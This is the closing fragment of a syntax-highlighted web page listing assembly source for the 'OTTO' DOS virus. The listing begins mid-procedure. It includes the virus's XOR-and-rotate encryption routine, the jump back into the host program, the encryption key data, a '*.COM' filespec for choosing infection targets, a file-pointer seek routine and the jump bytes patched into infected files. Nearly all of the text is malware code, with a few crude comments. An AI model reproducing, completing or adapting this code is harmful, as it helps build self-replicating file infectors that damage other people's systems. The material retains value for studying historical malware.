        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save our SI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">enc_bit</span><span class="sc0">       </span><span class="sc1">; Load AL with value of the</span><span class="sc0">
                        </span><span class="sc1">; encryption bit</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; Load CX with original 3 bytes</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Adjust value for offset of</span><span class="sc0">
                        </span><span class="sc1">; virgin code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">103h</span><span class="sc0">         </span><span class="sc1">; Load BP with offset of 103h</span><span class="sc0">
                        </span><span class="sc1">; Where the virgin code starts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">           </span><span class="sc1">; Copy this location to SI</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">         </span><span class="sc1">; Encrypt this portion of the</span><span class="sc0">
                        </span><span class="sc1">; code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Restore original SI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">     </span><span class="sc1">; Load BP with offset of start</span><span class="sc0">
                        </span><span class="sc1">; of the virgin code</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Jump to start of virgin code</span><span class="sc0">
</span><span class="sc5">otto_vir</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc5">encryption</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Rotate</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encryption</span><span class="sc0">

        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">encrypt</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'OTTO VIRUS written by:OTTO '</span><span class="sc0">
</span><span class="sc5">enc_ax</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">4353h</span><span class="sc0">           </span><span class="sc1">; Encryption shit loaded in AX</span><span class="sc0">
</span><span class="sc5">enc_dh</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">48h</span><span class="sc0">         </span><span class="sc1">; Encryption shit loaded in DH</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">54h</span><span class="sc0">
</span><span class="sc5">adj_ptr_loc</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">4355h</span><span class="sc0">           </span><span class="sc1">; Adjusted file pointer</span><span class="sc0">
                        </span><span class="sc1">; location (ptr_loc-3 bytes)</span><span class="sc0">
</span><span class="sc5">work</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4Bh</span><span class="sc0">         </span><span class="sc1">; A work buffer</span><span class="sc0">
</span><span class="sc5">ptr_loc</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">; File pointer location</span><span class="sc0">
</span><span class="sc5">copyright</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'COPYRIGHT MICROSHAFT INDUSTRIES '</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'1992 (tm.)PQR'</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">; Everything below here appeared as a bunch of hex shit I had to convert...</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">

</span><span class="sc5">move_ptr_start</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; Move fp to start (B80042)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; (33C9)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; (33D2)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; Call DOS (CD21)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; (5A)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; (59)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; (58)</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; (C3)</span><span class="sc0">
</span><span class="sc5">move_ptr_start</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">filespec</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Location 295h</span><span class="sc0">

</span><span class="sc5">three_bytes</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">        </span><span class="sc1">; jmp 148 (Location 29Bh)</span><span class="sc0">
</span><span class="sc5">new_jump</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; jmp 150 (Loc 29Eh)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Loc 2A1h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Loc 2A2h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Loc 2A3h</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">



        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">


</span></div></body>
</html>
